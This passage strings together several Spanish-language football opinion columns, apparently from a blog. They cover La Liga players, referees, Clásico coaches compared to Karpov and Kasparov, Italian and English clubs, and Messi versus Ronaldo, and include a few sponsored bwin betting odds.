de culto, infrafutbolero y genio que uno no puede resistirse a escribir unos párrafos sobre él. Hablo de Vasilis Hatzipanagis.Cosa rara, Hatzipanagis nunca salió de Grecia.El último que se ha puesto de largo ha sido el joven Isaac Cuenca, que en su alternativa como titular ha mostrado lo punzante y hermoso del oficio de extremo, además de adornar su debut con un golazo que no olvidará. Y Tintín Deulofeu, en la recámara.La esmeralda oculta. Amenaza el avispero que rodea el Manzanares con llevarse por delante las posibilidades de la plantilla de este Atlético, que son muchas y buenas. A Diego, Falcao y Arda los protege su nombre internacional, más allá de puntuales rendimientos o estados de forma, y el conflicto de Reyes parece más personal con Manzano que deportivo; sin embargo Adrián, con sus 23 años, su currículum por construir y su aspecto indefenso y frágil, huele a carnaza en medio del huracán que agitan una directiva impresentable, un entrenador perdido y una afición tan desencantada como ardiente. Y es una pena, porque el asturiano parece uno de los más firmes valores en que podría apoyarse el futuro colchonero, un delantero moderno, fino y técnico, que de vez en cuando sacar recursos que firmaría el más potente de los nueves. Servidor creyó ayer que era el Tigre, y no él, quien dibujó el cabezazo inapelable que reventó el marcador del Calderón.Manos y manos. Aunque muchos comentaristas de fútbol –algunos ex jugadores- lo sigan obviando reiteradamente, para que una mano constituya infracción es imprescindible que el jugador toque el balón con la mano de modo voluntario. A partir de esta premisa básica, se puede discutir si los penaltis a los que dieron lugar los incidentes de Nsué y Romaric en Barcelona y Málaga constituyeron falta o no. En el primer caso, Adriano centra, y la pelota impacta a quemarropa con el bermellón, que esperaba con los brazos abiertos. Es difícil creer que cuando uno los abre de ese modo no cobija la intención de cortar “con lo que sea”, luego penalty. En la segunda acción, Romaric se lleva la mano al rostro para taparse el pelotazo de Jesús Gámez, y el balón golpea más en la cara que en el brazo que iba a protegerla. Aunque hubiera rozado la mano, se habría tratado de un lance seguramente instintivo, que el jugador no controla con la voluntad, así que en principio no hubiera debido pitarse nada. En cualquier caso, dos jugadas al límite, que merece discutir.Mucha clase, poca cabeza. Casi muere el primer tiempo cuando Álvaro Cejudo empalma un balón al borde del área que se cuela con suavidad en la meta de Munúa. Es el premio al buen trabajo de Osasuna, que acabará la tarde derribando al Levante del podio de la Liga. El delantero cordobés, una de las revelaciones de este comienzo de temporada a pesar de no ser precisamente un recién llegado, enloquece mientras la alegría se desborda por las gradas del antiguo Sadar. La nota discordante llega cuando el goleador, entendiendo mal la euforia, se quita la camiseta en un gesto que no por repetido acabaremos nunca de comprender. Inevitable la tarjeta, pues, que combinada con la segunda tras el descanso condena a su equipo a un calvario que no merecía. Quizá actitudes como ésta merezcan una sanción interna algo mayor que quedarse sin visitar el Bernabéu en jornada matinal.Maneras de perder. Estéril fue la jornada para Betis, Real Sociedad y Zaragoza, tres aficiones condenadas a graves problemas con la longitud de sus uñas en la recta final del campeonato. Sin embargo, el regusto de final de las derrotas resultó diferente. Los blanquiazules enfrentaron a sus rivales madrileños con el miedo por bandera, la defensa como tàctica y el catenaccio como estrategia, recibieron un tanto pronto, y se pasaron el resto del choque, Menotti dixit, sin saber muy bien si ser toro o torero. El Betis salió como siempre con esto último bien claro, reclamando la posesión y el mando del partido; no les funcionó porque el mecano de Cúper comienza a carburar, la suerte les sacó la lengua en forma de postes, y Mel no dispone del futbolista valioso que transforme, como él hacía cuando futbolista, la ortodoxia en pólvora. Dos tácticas legítimas, dos maneras de intentarlo, idéntico resultado… y sin embargo no es lo mismo. Fue en el 87, en Sevilla. A primera vista, un simple torneo que dirimiría el título de campeón del mundo de ajedrez: dos tipos frente a un tablero durante horas, prácticamente inmóviles, repitiendo un ritual en el que, a pesar de desarrollarse bajo reglas conocidas, sólo los muy iniciados poseen la capacidad para discernir si una jugada ha resultado genial o errónea, si alguien lleva ventaja, o si están perdiendo el tiempo y lo mejor es ir a tablas. A estos niveles, un juego más allá de lo complejo, despiadado y fríamente elitista, que uno podría pensar muy alejado del interés de los mass media y del público en general.Sin embargo, aquel otoño, todos los focos apuntaban a España. Los telediarios informaban puntualmente de los resultados de cada partida –el campeonato estaba pactado al mejor de 24-, los periódicos se llenaban de analistas prestos a desentrañar los arcanos del juego al aficionado de a pie, y muchos nos esforzábamos sin descanso para lo que, en otros juegos o deportes, es inmediato de las imágenes: saber qué demonios estaba pasando en esa habitación. A veces, incluso colocábamos las piezas en el tablero y repetíamos los movimientos de los maestros, en un intento normalmente vano de capturar algo de la magia que sabíamos que, pese a todo, estaba ahí.Si el duelo de Sevilla alcanzó tal relevancia mediática, fue sin duda por el carisma y la personalidad de los dos contendientes, y también por el contraste –al menos aparente- entre ellos. Con Fischer desaparecido en combate, se trataba de los dos mejores jugadores del momento, a una distancia sideral de los demás. Kárpov era el representante de la vieja guardia, el niño mimado del antiguo establishment comunista que, en tiempos de perestroika, se estaba desmoronando: Kaspárov, en cambio, mostraba simpatías por el reformismo que estaba al fin abriéndose paso en su país, y era bastante más joven. El cóctel de competividad, genio, ferocidad y capacidad estratégica resultaba irresistible para la opinión pública, y llevaba el duelo a la altura de los más enconados que haya visto el deporte: Foreman vs Ali, Ben Johnson vs  Carl Lewis, Nadal vs Federer, o el más visceral y prolongado de estos tiempos,  Mourinho vs Guardiola.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line.Es fácil a priori establecer el paralelismo entre las dos prima donna de los banquillos y aquellos dos genios de los escaques. José tiene mucho de Anatoli: las virtudes como estratega en condiciones difíciles, el caràcter hosco y autoritario, un cierto conservadurismo en su concepción del mundo, y haber llevado al límite de su eficacia algunos sistemas tácticos bien conocidos. Pep, en cambio, ha destacado por lanzar el fútbol hacia el futuro, por mirar más hacia delante. Más cercano en el trato personal, la semejanza con Kasparov llega hasta un apego desaforado a sus raíces: tanto da Cataluña como Azerbaiyán.Antes de Sevilla, la doble K se había enfrentado tres veces. En el primer duelo, tras 48 partidas y un final muy polémico, Karpov retuvo el título, y podemos decir que la prensa mundial sacó los aspersores. En el segundo, Moscú-85, el cetro cambió de manos; Gari jugó un ajedrez de altísimo nivel,  y aunque no pudo coronarse campeón hasta prácticamente el final, todo el mundo sabía desde hace tiempo que ese título tenía dueño. La mítica partida 16, una exhibición del azerí, admite sin problemas la comparación con un 5-0. La revancha se disputó al año siguiente, entre Londres y la antigua Leningrado, y la resistencia de Kárpov resultó tan numantina que el mundo se sorprendió cuando su rival, hasta entonces tranquilo y frecuentemente simpático, mostró su rostro más acre y desagradable vertiendo todo tipo de acusaciones, acusando de espionaje a sus analistas, y exhibiendo una parte de su personalidad desconocida hasta el momento. En cualquier caso, consiguió retener el campeonato en las escasas partidas que restaban, y llegó a Sevilla tanto con el favoritismo por su sensacional desempeño como con la aureola angelical que le granjeaba las simpatías de un público que no dio importancia a su comportamiento en el  tenso final del campeonato anterior. Allí, un nuevo empate técnico volvería a dejar el título en sus manos. Busquen las semejanzas si las hay, puede que no, pero lo cierto es que Guardiola ha ganado dos partidos más que su rival en los enfrentamientos directos (diríamos 6-4 en términos ajedrecísticos) y también aventaja a Mou en títulos ganados tras dichos choques. Hoy encaran su undécimo enfrentamiento, y es de esperar que, a diferencia del partido de ida, el catalán alinee sus mejores piezas sobre el tablero. Si Villa mantuvo a su equipo en la eliminatoria con un movimiento diagonal digno del mejor alfil y Messi casi la resuelve –la Pulga es la reina, nadie tan poderoso como él sobre los escaques-, hoy es muy probable que vuelva Piqué para fortalecer el enroque, y retornen Xavi y Busquets para asegurar el centro del tablero, territorio clave cuyo control suele garantizar la victoria; para eso también ha venido Fàbregas. Con estos mimbres, no es fácil que la victoria se le escape al Barça, a quien –como a Gari en Sevilla- le vale el empate, o al menos los empates habituales.Habrá que ver también qué inventa Mourinho, que puede envidar con Coentrao, un pura sangre capaz de brincar por todo el tablero, y que debería refrenar un poco a ese Pepe que cada vez que se aventura alocadamente en territorio enemigo se juega acabar demasiado pronto fuera de la partida. En cualquier caso, y tras la buena impresión del partido de ida, puede que el luso vuelva a renunciar a la defensa siciliana de anteriores ocasiones, y plantee de nuevo una apertura agresiva que le otorgue la ventaja de inicio. La solución, a partir de la una de la mañana, mínimo, gentileza de la UEFA y la Federación.Por cierto, las primeras partidas del envite de Sevilla despertaron una expectación inusitada, pero poco a poco la repetición menguó el interés. Y no es descabellado ver 24 clásicos en tres o cuatro años…Bwin ofrece un amplio abanico de apuestas para este partido. Que se adelante el Madrid en el primer tiempo, por ejemplo, se paga a 3,10. Un gol de Messi da 1,90, lo cual no está mal si pensamos que ya le ha anotado 11 goles al Madrid. Una combinada “final de Copa” (victoria del Madrid 0-1 con gol de Cristiano) da 30 a 1. La exhibición de una tarjeta roja se paga a 3,10, y que el Madrid no reciba tarjetas en el segundo tiempo se paga a 4,33. Después de la jornada de Europa League de ayer y la ida de los octavos de final de la Liga de Campeones, parece que se avecina una catàstrofe de enormes proporciones para el fútbol italiano. Es cierto que el Nápoles, serio aspirante al Scudetto, se batió con bravura en el Madrigal a pesar de jugar la mayor parte del partido privado de su mejor futbolista –en una decisión muy discutible, Walter Mazzarri lo reservó a Cavani para el partido contra el Milan del próximo lunes-, pero también lo es que le remontó un Villarreal que no pasa precisamente por el mejor momento de la temporada.Ésta es sólo la punta del iceberg. Lo que hay por detrás es que la escuadra napolitana era la única superviviente del cuarteto que comenzó a disputar la segunda competición continental. En la fase de grupos habían caído la Sampdoria, tercera por detrás del mítico Metalist Kharkiv; el Palermo de Pastore, que salió trasquilado de Moscú y Praga e incluso encajó un 0-3 con el CSKA; y la histórica Juventus, que en una especie de apoteosis del resultadismo empató todos los partidos de la liguilla. Argüirán los bianconeri que así empezó la Italia campeona en España 82, pero lo cierto es que la regla de los tres puntos se creó precisamente para casos como éste, y no es de recibo que el Lech Poznan le saque cinco puntos a todo un bicampeón de Europa, con todos los respetos para los polacos.Hasta aquí lo fehaciente e inevitable. Pero es que si echamos un vistazo a lo que ha pasado en la Copa de Europa y sobre todo a lo que es normal que pase, el panorama es desolador. El Milan, líder de la Liga y orgulloso poseedor de un tridente deslumbrante, ha caído ante unos Spurs que ya no aspiran a casi nada en Inglaterra; la Roma, una ruina este año, dobló la rodilla ante el Shakhtar en un festival de errores defensivos que se repitió unos días después en Génova; y al Inter lo tumbó un gol final de Mario Gómez en San Siro en un partido en el que si alguien mereció la victoria fueron los teutones. Si se cumple la regla no escrita de que una victoria fuera es oro puro en Europa, podemos asistir a una primavera sin equipos italianos en ninguna competición continental. ¿A qué se debe esta decadencia? Hay que ser cuidadosos al intentar sacar conclusiones, y no olvidar que por ejemplo el campeón de Europa actual es transalpino. Sin embargo, en un anàlisis un poco más amplio, la victoria del Inter de Mourinho–gran sorpresa, por otra parte- se lee más como una excepción que como una regla. Los últimos años han visto una pujanza de las ligas inglesa y española que las ha distanciado en interés y calidad de las demás, y mientras por ejemplo la Bundesliga ha buscado una tercera vía –basada en la inagotable y multicultural cantera alemana, un fútbol dinámico y divertido y unas gradas siempre llenas- la serie A languidece entre partidos de ritmo paquidérmico, la creciente mala prensa del catenaccio, el poder de los ultras, los estadios semivacíos y la falta de credibilidad heredada de los castigos de risa del Moggigate. El resultado es un círculo vicioso: pocos son los grandes futbolistas en plenitud que quieren emigrar a Italia, el campeonato pierde atractivo, la falta de atractivo aleja a los inversores, y por tanto no hay dinero para traer a nadie. Y aunque Italia es un país al que el fútbol le debe tanto que cuesta no creer en una resurrección, no es fácil saber por dónde podría producirse ésta. Pronóstico reservado, pues. Nunca en la historia del Liverpool se había destituido a un entrenador tras seis meses escasos de trabajo (la sustitución de Souness por Moran se produjo en circunstancias muy diferentes), pero la performance de Roy Hodgson en Anfield ha resultado tan desastrosa, que uno incluso disculpa a los directivos del Liverpool por romper una costumbre tan sana y tan ancestral. El bueno de Roy, que venía de una muy buena temporada en el modesto Fulham, sale escaldado de su segunda experiencia en un grande, tras un tiempo en San Siro en el que lo que más se recuerda de él es que le dio boleto a un Roberto Carlos que casi sólo conocían los incondicionales del PC Fútbol. Para ser justos, hay que decir que seguramente Hodgson intentó torear un morlaco que le venía grande: el equipo ya llegaba en dinàmica perdedora, con la plantilla desestructurada y jugadores franquicia en muy baja forma. Su mano no se ha notado, y este año habrá que anotarlo, milagros aparte, como de transición.Como a rey muerto rey puesto y no hay mal que por bien no venga, los mitómanos hemos de congratularnos de que la crisis liverpudian lleve al banquillo de Anfield –y de paso al candelero mediático- a una de las mayores leyendas del club, Kenny Dalglish. Bien mirado, la decisión de la directiva resulta doblemente inteligente: por un lado, muestran poseer el apoyo de una de las personalidades más influyentes en todo el entorno del club de Mersey; y por otra, se dota del mejor paraguas posible para la lluvia de críticas, dado que pocos scousers se van a atrever –al menos al principio- a criticar a este hombre que en Liverpool lo ha sido todo menos balón. Está por ver si el que fuera sensacional futbolista recuerda más en el banquillo a sus magníficas temporadas de entrenador-jugador red, a sus años gloriosos en Blackburn, o a sus dos experiencias fallidas en Glasgow y Newcastle. En cualquier caso, será un placer volver a ver al rubio inconfundible al frente de su escuadra.Todo el ruido mediático producido por el cambio de guardia en Liverpool ha tapado un poco la confirmación del que sin duda es el traspaso estrella de este invierno: el fichaje del bosnio Edin Dzeko por el City, previo pago de 35 millones de euros –desconocemos la equivalencia en petrodólares- del club citizen al Wolfsburgo. Con Dzeko, Mancini recibe quizá al único delantero de nivel mundial que quedaba en Europa en un equipo de clase media, a la vez que una pareja perfecta para el incansable e indiscutible Apache. Adebayor y Balotelli pueden estar temblando, pues va a vestirse de celeste un goleador de raza, nueve puro de formación pero moderno en sus movimientos, que se asocia en corto con inteligencia y dinamismo y sabe ser frío como pocos cuando hay que serlo. No ha sido suficientemente ensalzada su hazaña con el Wolfsburgo –¿quién sabía algo de esta gente antes de ser campeones de la Bundesliga? - y quizá por ello nadie se había atrevido a soltar la morterada que vale nuestro hombre. Si es capaz de adaptarse rápido a un fútbol muy diferente al germano, y sobre todo sobrevive en la jungla hasta que por fin el City tenga un entrenador, el club de los jeques habrá adquirido, esta vez sí, un argumento de verdad para acceder al Olimpo del fútbol europeo. Sabido es que los aficionados al fútbol, de un tiempo a esta parte, se vienen dividiendo en dos categorías: los que piensan que asisten a una lucha heroica, titánica e irrepetible, semana a semana, por el título de mejor jugador del mundo, y los que creemos que la distancia futbolística que media entre Cristiano Ronaldo y Leo Messi es casi tan sideral como la que separa a la Pulga de cualquier otro futbolista. Casi todo es opinable en fútbol –para empezar, qué significa que un jugador sea mejor que otro- doctores tiene la Iglesia,  y muchos ríos de tinta se han vertido sobre esta asunto para comenzar ahora otra comparativa pormenorizada de los dos cracks. En su lugar, vamos solamente a comentar algunas circunstancias llamativas a partir de una única premisa: la capacidad para romper los partidos.Siempre un buen punto de partida para comenzar cualquier análisis es fijarse en la estadística. Cuando Leo Messi se inventó el cabezazo parabólico del sábado que rompió por primera vez la red de Dudu Aouate, consumó la undécima ocasión en que marcaba esta Liga un gol con el Barcelona estando, o bien el marcador en empate, o bien su equipo por debajo  -circunstancia que sólo ha sucedido contadas veces en el campeonato-; esto supone casi la mitad de los partidos que ha disputado el club catalán. Si sometemos al mismo análisis a CR7, obtenemos que el portugués sólo ha mojado en tan delicadas circunstancias en cinco ocasiones; casi las mismas que Higuaín, por cierto, de quien ya casi no se acuerda nadie. Un porcentaje inferior a la cuarta parte de los encuentros que ha jugado el Real Madrid.Normalmente, la diferencia entre jugar contra un rival que va ganando o empatando o contra uno que va perdiendo son bien claras: mientras el contrario mantiene la esperanza, las posiciones se guardan, la presión se multiplica y los jugadores del equipo pequeño mantienen la ilusión de derrotar al grande y ser protagonistas por un día en el mundillo futbolístico; por el contrario, con el marcador en contra, el orden táctico pasa a disminuir, las necesidades ofensivas agrietan lo que anteriormente era una roca, y el futbolista, poco a poco, comienza a notar el peso de la derrota como un fardo que lo entorpece; todo se vuelve cuesta abajo para el grande, que suele acabar resolviendo el partido con mayor o menor facilidad. Esto vale para todas las pequeñas reproducciones futboleras de la lucha entre David y Goliat.Digo esto porque he llegado a prejuzgarlos por sus pintas, por sus explicaciones, por sus peinados y modelitos lejos del campo. Por cómo hablan, cómo se justifican, por la candidez de sus propuestas, por las palabras tediosas que comparten.Rafa Benítez es un hombre de fútbol. Está en Primera como podría estar entrenando a los cadetes de la U.D. Las Palmeras de Córdoba. Un hombre de chándal, de Cruzcampo tras el partido, de ver los resúmenes de la jornada en Canal Sur. Un padre justo, un marido atento, que se ríe con los chistes de los demás, pero que nunca cuenta uno. Benítez es un estudioso de las cosas que no se estudian, obsesivo por aburrimiento, un maniático doméstico. Un hombre al que el éxito y el fracaso parecen afectarle de la misma manera. Un entrenador cansado, de caminar lento y pensar rápido. Tímido con los padres de sus jugadores pero seco con sus pupilos. Un hombre normal en la expresión más cruel de la palabra.Pedro es un jugador explosivo y callado. Un futbolista al que parece que el fútbol buscó y no al revés. Un talento infuso que parece excusar, como si creyera que no lo merece. Al que se le llamó Pedrito hasta ayer. Su salida del Barcelona ha sido suavona y por lo bajini. No se ha plantado, no ha buscado el enfrentamiento. Su única muestra de disconformidad consistió en apartarse medio metro del resto al recoger la Supercopa de Europa. Tras un gol suyo. Tras jugar cuando nadie quería que jugase. Ese medio metro como un pataleo infantil y blando. Ayer se despidió y lo hizo con amabilidad. Había una sombrita de culpa en su cara. “Yo me quería haber retirado en el Barcelona” dijo como si tuviera la esperanza de que alguien entre el público se opusiera a la marcha, como el enamorado adolescente que se opone a una boda. Pedro es un jugador silencioso, con rabia enfrascada, con el pulso de un glacial. Por eso quizá es tan bueno, o por eso quizá es tan prescindible. Primero en la Selección y ahora en su club, del que ya no es parte, al que tres jugadores con más tinta en la piel, más mala leche y menos amables le han quitado el puesto.Benítez no ha empezado bien la Liga y Pedro lo ha hecho como una estrella en el Chelsea de otro personaje que no es de esta especie sencilla, Mourinho. Al primero le toca remar, al segundo lo arrastran aguas benévolas. En un fútbol extraño ambos son excepcionales. No sé si a los aficionados nos gusta la gente así. De momento los dos están en tránsito, buscando dónde quedarse, dónde seguir haciendo una vida normal, con sus costumbres normales, con su insólita sencillez. No vi al Madrid anoche. Ver fútbol ha empezado a convertirse en un lujo. Ir a un bar, puede ser, pero la cerveza –que no es una ni dos- hay que pagarla, y la tapa. Y lo de las plataformas digitales pues demasiada pasta. Y verlo online, pues no estoy hecho para ver el fútbol pixelado, a saltitos y con buffer o como se diga. Resumiendo: que no vi al Madrid. Y eso que el partido se antojaba plácido. En Twitter, ese show de gitano con cabra tan zarrapastroso y ruidoso como culposamente atrayente, pude seguir, a través de mis estimados seguidos, lo que pasaba en el campo. Cuando el empate parecía lo justo tras un, según leí y confío, tedioso y romo partido del equipo de Ancelotti, vino lo del penalti de Muñiz Fernández y otros asuntos, tangenciales pero jugosos, sobre los que opinaré aquí.Muñiz. Una vez vista la jugada tengo claro que el penalti es porque se pita, pero poco más. El rifirrafe no tiene la suficiente entidad como para ser punible. Pepe forcejea del mismo modo que Carlos Sánchez y fuerza la caída, es decir, busca la pena máxima, busca la reacción del árbitro. Me recordó al tonto penalti de Hierro frente a Irlanda en el Mundial de Corea. Pero no sé por qué se crearon vínculos con aquello. No es lo mismo. La sensación tras lo de anoche es terrible. Es como una novia que te deja con una excusa pasajera y piensas, de inmediato, que hay algo más. No quiero pensar que hay algo más en el arbitraje de nuestro fútbol. No puedo disfrutar de este deporte pensando en que, en el fondo, todo es una trampa. No puedo pensar en la Liga como si la hubiera escrito un tramposo y efectista guionista de Lost. Muñiz Fernández me desagrada, en lo estético. Desde ayer en lo ético. No puedo evitar ver algo más, quizá una tendencia a proteger al grande. Como un funcionario pelotas que lleva el café a los jefes casi por inercia. Quiero pensar que no está pactado, sino que él es así, un acomplejado cruel con los más indefensos. Que va a lo fácil.¿Qué especificidades dependen del Madrid y del Barcelona? Es evidente que el juego posicional del Barcelona es bastante mejor que el del Real Madrid, su velocidad de balón es mucho mayor y sus jugadores, uno por uno y salvo alguna excepción, son superiores; a su vez, esto no significar negar el poderío de la vanguardia blanca, que admite pocas comparaciones fuera de España. Sin embargo, ante defensas cerradas ambos equipos (y cualquiera) suelen sufrir bastante, pues los recursos colectivos de los grandes –y muy especialmente del Barça, basta ver sus números- resultan especialmente brillantes y eficaces cuando el rival no está colgado del larguero. Este mismo fin de semana contemplamos el suplicio de ambos frente a rivales bien cerrados, y también la duración de la tortura: todo el partido para los blancos y media hora para el Barcelona. La diferencia, como casi siempre, fue Messi.Y es que llegada la hora de la verdad, cuando el partido es duro y no hay huecos, se ve la enorme diferencia entre ambos jugadores. Con un Barcelona carente de juego combinativo y sin apenas presencia en el área rival, Leo se presentó primero en el área del Mallorca con un desmarque casi indetectable al primer palo, y marrada esta ocasión, decidió a la segunda con otra penetración vertical, gran control y recurso de delantero puro. Otras veces rompe la defensa con regates desde parado –quizá la suerte más difícil del fútbol- rodeado de contrarios, aparece un segundo en el hueco que nadie esperaba para clavarla, se inventa un disparo automático que siempre va a una esquina, o facilita el tanto a Pedro o a Villa con una asistencia que firmaría un Laudrup cualquiera. El perfecto abrelatas.En las mismas circunstancias, Cristiano Ronaldo –siempre muy competitivo, hay que reconocérselo- adquiere el monopolio de la pelota, conduce y controla, baila sobre el balón, taconea, la pisa… pero rara es la vez, sin cinco metros por delante, que desborda. Sus piernas son cañones, pero los disparos que salen de ella necesitan una preparación que no suele conceder una defensa bien organizada. No deslumbra por su capacidad combinativa, y tampoco por buscar el desmarque en espacios cortos, por lo que sus opciones en circunstancias adversas se reducen al balón parado, bien como cabeceador, suerte que domina a la perfección, o bien como lanzador de faltas. Buenos recursos, pero quizá insuficientes en el contexto que nos ocupa. En cambio, no hay jugador más feliz ni dañino que Cristiano cuando el equipo contrario está abierto. Entonces llega el momento del atleta, el bisonte tomando la pradera, la galopada, los dobletes, los hat-trick y lo que se tercie; una caja registradora de goles, que lo pide todo y se lo juega todo. Pero para que llegue ese momento, el del jolgorio, el disfrute y la alegría, alguien tiene que haber roto en mil pedazos el candado; el alguien que no tuvo el Madrid ni en Pamplona, ni en Valencia, ni en Almería, ni en Mallorca. El hombre que marca, también a decenas, los goles que además de engordar estadísticas, valen partidos y títulos. El que hace casi siempre que sus compañeros, todos grandes futbolistas, parezcan todavía mucho mejores de lo que son al enfrentarse a equipos obligados por él a dejarlos jugar y abrir los espacios. La prueba de la gran paradoja de nuestro tiempo, que el equipo más coral que se haya visto dependa tanto de un solo hombre. El mejor jugador del mundo, quizá el mejor que nos quede por ver. Se parece al Madrid-Barça en que es un enfrentamiento entre dos equipazos que a priori detiene el Planeta Fútbol, y en que corre serio peligro de estomagar y aburrir debido a la repetición tras repetición. Manchester United y Chelsea son los dictadores de la Premier en los última década –los últimos siete títulos se los han repartido entre ambos- y se encuentran el próximo domingo en el césped de Old Trafford por primera vez en esta temporada. Aunque los clubes llevan trayectorias disparejas desde que comenzó el campeonato, en el comienzo del curso los une una tendencia tan deseable como arriesgada: la necesidad de renovación.No hay lugar a dudas en que los red devils lo tienen mucho más fácil. Para empezar, nadie puede discutirle el mando a Alex Ferguson, cacique desde hace 25 años, responsable de mil versiones de esta escuadra ganadora, y a quien no le tiembla el pulso ni para sentar a vacas sagradas ni para introducir savia nueva. Hoy mismo ha realizado una convincente defensa de De Gea tras su titubeante comienzo y la consiguiente suplencia en Lisboa, y por estos primeros partidos han ido desfilando Smalling, Jones, Cleverley, Welbeck o Young sin que el engranaje se resienta, la gente eche de menos al incomparable Scholes, y la imagen de tótems como Vidic, Ferdinand o Berbatov en el banco no genere más que una morbosa curiosidad. También es verdad que ayuda que tu jugador franquicia se encuentre en el mejor momento de su carrera, con confianza suficiente para anotar dos veces de falta en el mismo partido, y pulverizando récords de productividad goleadora ante rivales tan reputados como Tottenham o Arsenal. De la mano de este Rooney, del descaro de estos jóvenes talentos y también del empaque de ilustres veteranos como Park o Giggs –que pregunten por él en el barrio de Benfica- el United surca el principio de temporada como un portaaviones.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Al oeste de Londres, sin embargo, los aires renovadores se infiltran con mayor dificultad, y no va a ser tan sencillo que ejerzan el efecto deseado; probablemente, porque el Chelsea ha construido su identidad reciente a partir de un puñado de extraordinarios veteranos que han sido muchos años el core del equipo y se van acercando al final del camino: mientras las apariciones fulminantes de Lampard o Drogba se espacian cada vez más,el cuerpo indomable del Búfalo Essien acusa año tras año los cientos de kilómetros recorridos, John Terry acumula una leyenda negra que le pesa cada vez más, o se sigue recordando con demasiada nostalgia la versión de Cech sin el dichoso gorrito. Era la columna vertebral, y su sustitución no es fácil. De momento, el equipo se entrega a las cabalgadas de un purasangre como David Luiz, a quien aún le sobra un punto de anarquía; al juego chispeante y dinámico del recién llegado Juan Mata, noticia estos días por curiosas razones, o al delicado perfil de Sturridge, un delantero que apunta muy alto y que pide minutos a gritos. El equipo va sacando partidos sin convencer, mientras el bisoño Villas Boas trata de ajustar el cambalache entre efectividad y preciosismo, y un murmullo recorre el Bridge cada vez que el Niño falla una nueva ocasión de gol; el de Fuenlabrada vive cuestionado desde todos los ámbitos, la competencia es feroz, y ya está comiendo suplencia más de lo deseable. La inversión realizada le protege de momento, pero si no mejora su estado de forma, se mete además en polémicas y su nombre desaparece de las alineaciones, su carrera de azul puede ser mucho más corta de lo que todos pensamos en invierno. Recuérdese a Shevchenko.Estos serán pues los parámetros bajo los que se moverá el choque del domingo, el de un gran equipo mejorado y el de otro en época de cambio y reconstrucción. A pesar del favoritismo a priori del Manchester, es difícil apuntar un pronóstico, quizá porque se presenta un intangible que puede beneficiar al Chelsea: victoria o derrota, las consecuencias serán mucho más definitivas y/o duraderas para los blues: o bien gran espaldarazo al nuevo proyecto y al entrenador o, en caso de catástrofe, futbolistas que saldrán señalados quizá definitivamente. Y es bien sabido que en fútbol el equipo que más se juega suele quedarse más cerca del triunfo. Ya veremos.Es un partido en el que puede hacerse dinero.Que hace real aquello de que es más sencillo pitar a favor de los grandes. Su penalti me dolió, por el momento, por ese minuto en el que el partido ya llevaba 120 segundos muerto. Me da tristeza ganar así. Tristeza, no indignación, sólo tristeza. Me hace cooperador necesario de su delito. Me hace parte de su vileza, por ser del Madrid, por ser cómplice de su mezquindad o de su, suavicémoslo al final del párrafo, incapacidad para arbitrar partidos de tan alto nivel.Un punto. Borja Barba, timón del twitter de Diarios de Fútbol, habló en nuestra cuenta sobre lo increíblemente importante que era un punto para un equipo como el Elche. Le contesté instintivamente sobre la importancia de ese mismo punto para el Real Madrid. Y me obligué, por aquello, a escribir este texto. Los ricos también lloran, contesté. Borja me habla de algo difícil de rebatir: un descenso duele más que no ganar una Liga –a un equipo acostumbrado a ganarlas, claro, no hablamos del penalti de Djukic-. Yo soy muy relativista en ese asunto, o demasiado empático. Creo que el dolor de los demás es siempre válido. Hago un esfuerzo por no asesinar a mi amigo que se queja amargamente de que ya no puede mantener su piso en la playa mientras que yo malvivo en un piso compartido con otras tres personas, intento no coger de la solapa a la pareja que, con dos sueldos de funcionario, no pueden llegar a fin de mes y se quejan de la situación del país mientras comen sushi a razón de treinta euros el platazo. No soy paternalista con los equipos pequeños. Me dan igual, los pongo en la misma onda que a los grandes. Será que soy del Córdoba y estoy curtido en esos asuntos, pero yo no creo que los puntos valgan más cuando eres poco que cuando eres mucho porque el dolor en el fútbol es proporcional a lo vivido. Igual que las alegrías. Por eso no creo que el ascenso del Elche valga más que una Copa del Rey del Madrid. Y si peco de insensible, lo asumo. Es como aquel que, ante una matanza de niños en EEUU dice: en Irak mueren el doble de niños por el ataque militar de EEUU. Y algo en mí sufre un pinchazo, el corazón o el hígado, y creo que no se debe mercadear sentimentalmente con la muerte de nadie, por más razones que se tengan. Por eso, Borja, creo que el punto es el punto, para los dos. Y perdóname los ejemplos porque sé que eres un hombre sensible con el fútbol. Un punto simplemente, por más que unos puedan bajar por su culpa y los otros jugar previa de Champions en vez de ir de forma directa.El Madrid de Ancelotti. Ayer muchos de vosotros criticabais el juego del Madrid. Sin ser yo un experto en fútbol internacional, lo que he visto a los equipos de Ancelotti nunca ha sido para aplaudir desde el sofá. Es un entrenador en el sentido que entrena, que marca las pautas, que tiene al vestuario controlado, pero cuyo rendimiento en el campo siempre depende del día que tengan sus jugadores. Eso no es poco con una plantilla de oro como la de Real Madrid. Cuando jugaba al Pro siempre sacaba a los mejores. Nunca pensaba, en mi Manchester United, que tal vez Fletcher tenía más dígitos en defensa y que mejor él, con más fondo, que Scholes que enseguida se desfondaba. Yo sacaba a Scholes porque le pegaba fuerte desde el borde y a la primera que pillaba pimba con el botón del cuadrado a media barra. Tengo la sensación de que Ancelotti es un jugador de Pro. Ayer, he visto esta mañana un amplio resumen, el Madrid no parecía atacar con orden. El partido contra el Getafe, ese sí lo vi, me pareció fofo, abotargado, con un ritmo lento y con demasiada fe en las individualidades. No quiero nombrar a Mourinho en vano, vaya a ser que le de por volver, pero el portugués tenía un plan –disparatado quizá o irrealizable- pero Carlo no parece tener ninguno. Él saca a los jugadores y confía en su talento. Por eso tal vez sobraba Özil, un jugador de sistema, con tendencia a desaparecer pero una bisagra de lujo en un mecanismo bien ordenado. No sé qué le espera al Madrid. No quiero leer a Ramón J. Flores que vaticina un descalabro y cero títulos. Pero tampoco veo mimbres de futuro. La Champions, como siempre, parece el objetivo. Y para ganar una Champions tampoco hace falta jugar como lo hacía el Barça de Guardiola, afortunadamente, porque aquello difícilmente se repetirá en un futuro reciente.Piqué y Arbeloa. Iba a llamarlo “el pique de Piqué”, pero me he contenido. Se nos llena la boca hablando de libertad de expresión y ahora que los jugadores se humanizan y comparten sus enfados, les queremos callar la boca. Estoy harto de una sociedad que censura el desborde emocional. Queremos el politeness inglés que sólo sirve para larvar odios aún mayores. Si Piqué se enfada, que lo diga.Si Arbeloa rechista, bienvenido sea. No son menos profesionales por exteriorizar, libremente, sus enfados. Nosotros somos los que debemos 